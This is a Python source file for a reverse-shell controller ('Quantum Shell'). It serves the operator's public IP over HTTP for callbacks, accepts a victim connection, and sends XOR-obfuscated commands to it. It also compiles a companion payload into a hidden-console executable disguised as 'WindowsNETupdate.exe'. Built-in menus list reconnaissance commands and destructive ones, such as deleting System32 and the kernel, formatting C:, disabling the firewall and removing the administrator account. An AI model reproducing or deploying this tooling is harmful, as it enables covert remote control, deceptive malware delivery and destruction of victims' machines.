import socket
import sys
import os
import threading
import requests
import time
import subprocess
import shutil

if sys.platform.startswith('win'):
    os.system('chcp 65001 > nul')
    os.system('cls')
else:
    os.system('clear')

ATTACKER_IP = "0.0.0.0"
ATTACKER_PORT = 9999
SECRET_KEY = b"edgar"

def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=10).text.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    try:
        ip = requests.get('https://ipinfo.io/ip', timeout=10).text.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    try:
        ip = requests.get('https://icanhazip.com', timeout=10).text.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    return None

def update_public_ip_periodically(interval=300):
    def update():
        while True:
            try:
                ip = get_public_ip()
                if ip:
                    with open('current_ip.txt', 'w') as f:
                        f.write(ip)
                    print(f"[OK] Public IP updated: {ip}")
                else:
                    print("[!] Could not get public IP")
            except Exception as e:
                print(f"[!] Error updating public IP: {e}")
            time.sleep(interval)
    t = threading.Thread(target=update, daemon=True)
    t.start()

from http.server import HTTPServer, SimpleHTTPRequestHandler

class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/current_ip.txt' or self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            try:
                with open('current_ip.txt', 'r') as f:
                    ip = f.read().strip()
                self.wfile.write(ip.encode())
            except Exception:
                self.wfile.write(b"127.0.0.1")
        else:
            super().do_GET()

def run_http_server():
    handler = CustomHTTPRequestHandler
    httpd = HTTPServer(('0.0.0.0', 8000), handler)
    print("[*] HTTP server started on port 8000 to serve current_ip.txt.")
    print("[*] Available endpoints:")
    print("[*]   - /current_ip.txt - Returns current public IP")
    print("[*]   - / - Returns current public IP")
    httpd.serve_forever()

def banner():
    print("""

\033[32m     ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
\033[32m    ██╔═══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║    ██╔════╝██║  ██║██╔════╝██║     ██║     
\033[32m    ██║   ██║██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║    ███████╗███████║█████╗  ██║     ██║     
\033[32m    ██║▄▄ ██║██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     
\033[32m    ╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║    ███████║██║  ██║███████╗███████╗███████╗ 
\033[32m     ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ 
\033[32m                                                                                                            
\033[37m                    \033[1m\033[36m╔══════════════════════════════════════════════════════════════╗
\033[37m                    \033[1m\033[36m║                   By: Edgar The worlds greatest programmer   ║
\033[37m                    \033[1m\033[36m╚══════════════════════════════════════════════════════════════╝
\033[0m
    
    """)

def show_welcome_menu():
    print("""
\033[36m╔══════════════════════════════════════════════════════════════╗
\033[36m║                    🎯 QUANTUM SHELL MENU 🎯                  ║
\033[36m╠══════════════════════════════════════════════════════════════╣
\033[36m║ \033[33mhelp\033[36m                    - Show available commands            ║
\033[36m║ \033[33mcommands\033[36m                - List of test commands              ║
\033[36m║ \033[33mdestructive\033[36m             - List of destructive commands       ║
\033[36m║ \033[33mshell\033[36m                   - Choose between CMD or PowerShell   ║
\033[36m║ \033[33mclear\033[36m                   - Clear screen                       ║
\033[36m║ \033[33mexit\033[36m                    - Exit reverse shell                 ║
\033[36m╚══════════════════════════════════════════════════════════════╝
\033[0m""")

def show_help():
    print("""
\033[36m╔══════════════════════════════════════════════════════════════╗
\033[36m║                        AVAILABLE COMMANDS                    ║
\033[36m╠══════════════════════════════════════════════════════════════╣
\033[36m║ \033[33mhelp\033[36m                    - Show this command list             ║
\033[36m║ \033[33mcommands\033[36m                - List of test commands               ║
\033[36m║ \033[33mdestructive\033[36m             - List of destructive commands     ║
\033[36m║ \033[33mshell\033[36m                   - Choose between CMD or PowerShell    ║
\033[36m║ \033[33mclear\033[36m                   - Clear screen                       ║
\033[36m║ \033[33mexit\033[36m                    - Exit reverse shell                 ║
\033[36m╚══════════════════════════════════════════════════════════════╝
\033[0m""")

def show_commands():
    print("""
\033[36m╔═══════════════════════════════════════════════════════════════╗
\033[36m║                    TEST COMMANDS                              ║
\033[36m╠═══════════════════════════════════════════════════════════════╣
\033[36m║ \033[33mwhoami\033[36m                  - Show current user                   ║
\033[36m║ \033[33mhostname\033[36m                - Machine name                        ║
\033[36m║ \033[33msysteminfo\033[36m              - Detailed system information         ║
\033[36m║ \033[33mipconfig /all\033[36m           - Complete network configuration      ║
\033[36m║ \033[33mnetstat -an\033[36m             - Open ports                          ║
\033[36m║ \033[33mtasklist\033[36m                - Running processes                   ║
\033[36m║ \033[33mdir C:\\\033[36m                 - List C: files                       ║
\033[36m║ \033[33mdir C:\\Users\033[36m            - List users                          ║
\033[36m║ \033[33mnet user\033[36m                - List system users                   ║
\033[36m║ \033[33mnet localgroup administrators\033[36m - View administrators           ║
\033[36m║ \033[33msc query\033[36m                - List services                       ║
\033[36m║ \033[33mschtasks /query\033[36m         - Scheduled tasks                     ║
\033[36m║ \033[33mreg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"\033[36m║
\033[36m║ \033[36m                        - View startup programs               ║
\033[36m╚═══════════════════════════════════════════════════════════════╝
\033[0m""")

def show_destructive_commands():
    print("""
\033[31m╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
\033[31m║                    ⚠️  DESTRUCTIVE COMMANDS  |  USE ONLY IN VM! ⚠️                                            ║
\033[31m╠═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
\033[31m║ \033[33mRemove-Item C:\\Windows\\System32\\* -Recurse -Force\033[31m          | Delete system files                              ║
\033[31m║ \033[33mdel C:\\Windows\\System32\\ntoskrnl.exe\033[31m                       | Delete Windows kernel                            ║
\033[31m║ \033[33mformat C: /q\033[31m                                               | Format C: drive                                  ║
\033[31m║ \033[33mStop-Service -Name "spooler" -Force\033[31m                        | Disable print service                            ║
\033[31m║ \033[33mStop-Service -Name "lanmanserver" -Force\033[31m                   | Disable file sharing                             ║
\033[31m║ \033[33mnetsh firewall set opmode disable\033[31m                          | Disable firewall                                 ║
\033[31m║ \033[33mnet user administrator /delete\033[31m                             | Delete administrator account                     ║
\033[31m║ \033[33mtaskkill /f /im explorer.exe\033[31m                               | Kill explorer process                            ║
\033[31m║ \033[33mtaskkill /f /im winlogon.exe\033[31m                               | Kill login process                               ║
\033[31m║ \033[33m/a                          \033[31m                               |flag that shows hidden files                      ║
\033[31m║ \033[33mcopy "C:\\path\\to\\file.txt" "C:\\destination\\file.txt"  \033[31m| Copy file to another location                         ║
\033[31m╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
\033[0m""")

def build_executable():
    try:
        if getattr(sys, 'frozen', False):
            script_dir = os.path.dirname(sys.executable)
        else:
            script_dir = os.path.dirname(os.path.abspath(__file__))
        
        reverseshell_path = os.path.join(script_dir, "reverseshell.py")
        
        if not os.path.exists(reverseshell_path):
            print(f"[!] reverseshell.py not found at: {reverseshell_path}")
            return None
        
        print("[*] Building executable...")
        
        public_ip = get_public_ip()
        if not public_ip:
            print("[!] Could not get public IP")
            return None
        
        http_url = f"http://{public_ip}:8000"
        
        with open(reverseshell_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        if 'IP_SERVER_HTTP' in content:
            import re
            pattern = r"IP_SERVER_HTTP\s*=\s*['\"][^'\"]*['\"]"
            content = re.sub(pattern, f"IP_SERVER_HTTP = '{http_url}'", content)
        
        temp_reverseshell = os.path.join(script_dir, "reverseshell_temp.py")
        with open(temp_reverseshell, 'w', encoding='utf-8') as f:
            f.write(content)
        
        if not os.path.exists(temp_reverseshell):
            print(f"[!] Failed to create temporary file: {temp_reverseshell}")
            return None
        
        original_dir = os.getcwd()
        os.chdir(script_dir)
        
        try:
            pyinstaller_cmd = [sys.executable, '-m', 'PyInstaller']
            
            icon_path = os.path.join(script_dir, "network.ico")
            setupwizard_path = os.path.join(script_dir, "setupwizard.png")
            
            cmd = pyinstaller_cmd + [
                '--onefile',
                '--noconsole',
                '--name', 'WindowsNETupdate',
            ]
            
            if os.path.exists(icon_path):
                cmd.append('--icon')
                cmd.append(icon_path)
            
            if os.path.exists(setupwizard_path):
                if sys.platform.startswith('win'):
                    cmd.append('--add-data')
                    cmd.append(f'{setupwizard_path};.')
                else:
                    cmd.append('--add-data')
                    cmd.append(f'{setupwizard_path}:.')
            
            cmd.append('reverseshell_temp.py')
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300, cwd=script_dir)
            
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print(result.stderr)
            
            exe_path = os.path.join(script_dir, 'dist', 'WindowsNETupdate.exe')
            
            if result.returncode == 0 and os.path.exists(exe_path):
                final_exe = os.path.join(script_dir, 'WindowsNETupdate.exe')
                if os.path.exists(final_exe):
                    try:
                        os.remove(final_exe)
                    except Exception:
                        pass
                
                try:
                    shutil.move(exe_path, final_exe)
                except Exception as e:
                    print(f"[!] Error moving executable: {e}")
                    return None
                
                build_dir = os.path.join(script_dir, 'build')
                dist_dir = os.path.join(script_dir, 'dist')
                spec_file = os.path.join(script_dir, 'WindowsNETupdate.spec')
                
                try:
                    if os.path.exists(build_dir):
                        shutil.rmtree(build_dir)
                    if os.path.exists(dist_dir):
                        shutil.rmtree(dist_dir)
                    if os.path.exists(spec_file):
                        os.remove(spec_file)
                    if os.path.exists(temp_reverseshell):
                        os.remove(temp_reverseshell)
                except Exception as e:
                    print(f"[!] Warning: Could not clean up temporary files: {e}")
                
                print(f"[+] Executable created: {final_exe}")
                return final_exe
            else:
                print(f"[!] Build failed. Return code: {result.returncode}")
                if os.path.exists(temp_reverseshell):
                    try:
                        os.remove(temp_reverseshell)
                    except Exception:
                        pass
                return None
        finally:
            os.chdir(original_dir)
            
    except Exception as e:
        print(f"[!] Error building executable: {e}")
        import traceback
        traceback.print_exc()
        return None

banner()

if not os.path.exists('current_ip.txt'):
    print("[*] Getting public IP automatically...")
    ip = get_public_ip()
    if ip:
        with open('current_ip.txt', 'w') as f:
            f.write(ip)
        print(f"[*] Public IP obtained automatically: {ip}")
    else:
        print("[!] Could not get public IP automatically")
        ip = input("Enter current server IP to save in current_ip.txt (ex: 127.0.0.1): ").strip()
        if not ip:
            ip = "127.0.0.1"
        with open('current_ip.txt', 'w') as f:
            f.write(ip)
        print(f"[*] current_ip.txt file created with IP: {ip}")

update_public_ip_periodically(300)

http_server_thread = threading.Thread(target=run_http_server, daemon=True)
http_server_thread.start()
time.sleep(1)

print("\n[*] Do you want to create the executable before waiting for connection?")
choice = input("[?] Create executable? (y/N): ").strip().lower()

if choice == 'y':
    exe_path = build_executable()
    if exe_path:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"[+] Executable created successfully: {exe_path}")
        print("[+] Waiting for connection...\n")
    else:
        print("[!] Failed to create executable")
        input("\nPress ENTER to continue waiting for connection...")
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print("[+] Waiting for connection...\n")
else:
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    print("[+] Waiting for connection...\n")

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind((ATTACKER_IP, ATTACKER_PORT))
    s.listen(1)
except PermissionError:
    print(f"[!] Error: Port {ATTACKER_PORT} requires administrator privileges")
    print("[!] Try running as administrator or use a different port")
    exit(1)
except OSError as e:
    print(f"[!] Error binding to port {ATTACKER_PORT}: {e}")
    print("[!] Try using a different port")
    exit(1)

print("[*] Waiting for connection... (Press Ctrl+C or type 'exit' to quit)\n")

client = None
addr = None
exit_requested = False

def check_exit():
    global exit_requested
    try:
        user_input = input()
        if user_input.strip().lower() == "exit":
            exit_requested = True
            print("\033[31m[!] Exiting...")
            try:
                s.close()
            except Exception:
                pass
            sys.exit(0)
    except (EOFError, KeyboardInterrupt):
        exit_requested = True
        print("\033[31m[!] Exiting...")
        try:
            s.close()
        except Exception:
            pass
        sys.exit(0)
    except Exception:
        pass

exit_thread = threading.Thread(target=check_exit, daemon=True)
exit_thread.start()

try:
    s.settimeout(1.0)
    check_count = 0
    while not exit_requested:
        try:
            client, addr = s.accept()
            break
        except socket.timeout:
            check_count += 1
            if check_count % 10 == 0:
                print("[*] Still waiting... (Type 'exit' to quit)")
            continue
        except Exception as e:
            if exit_requested:
                sys.exit(0)
            print(f"[!] Error accepting connection: {e}")
            s.close()
            exit(1)
    
    if exit_requested:
        sys.exit(0)
    
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    print(f"[+] Connected with {addr[0]}\n")
except KeyboardInterrupt:
    print("\033[31m[!] Exiting...")
    try:
        s.close()
    except Exception:
        pass
    sys.exit(0)
except Exception as e:
    if not exit_requested:
        print(f"[!] Error accepting connection: {e}")
        s.close()
        exit(1)
    else:
        sys.exit(0)

show_welcome_menu()

shell_type = "cmd"

while True:
    try:
        cmd = input(f"\033[36m[{shell_type.upper()}]\033[37m Shell> ")
        if cmd.strip() == "":
            continue
        if cmd.lower() == "help":
            show_help()
            continue
        elif cmd.lower() == "commands":
            show_commands()
            continue
        elif cmd.lower() == "destructive":
            print("\033[31m[!] WARNING: These commands can permanently damage the system!")
            print("\033[31m[!] Use only on virtual machines or test systems!")
            confirm = input("\033[33m[?] Are you sure you want to see destructive commands? (y/N): ")
            if confirm.lower() == 'y':
                show_destructive_commands()
            continue
        elif cmd.lower() == "shell":
            print("\033[33m[?] Choose shell type:")
            print("\033[33m    1. CMD (cmd.exe)")
            print("\033[33m    2. PowerShell (powershell.exe)")
            choice = input("\033[33m    Choose (1/2): ")
            if choice == "2":
                shell_type = "powershell"
                print("\033[32m[+] Shell changed to PowerShell")
            else:
                shell_type = "cmd"
                print("\033[32m[+] Shell changed to CMD")
            continue
        elif cmd.lower() == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            continue
        elif cmd.lower() == "exit":
            print("\033[31m[!] Exiting...")
            try:
                exit_cmd = xor_encrypt_decrypt("exit".encode(), SECRET_KEY)
                client.send(exit_cmd)
            except Exception:
                pass
            try:
                client.close()
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
            break

        if shell_type == "powershell":
            if not cmd.startswith("powershell"):
                cmd = f"powershell -Command \"{cmd}\""

        enc_cmd = xor_encrypt_decrypt(cmd.encode(), SECRET_KEY)
        client.send(enc_cmd)

        enc_output = client.recv(4096)
        output = xor_encrypt_decrypt(enc_output, SECRET_KEY)
        print(output.decode(errors="ignore"))

    except Exception as e:
        print(f"[!] Error: {e}")
        break
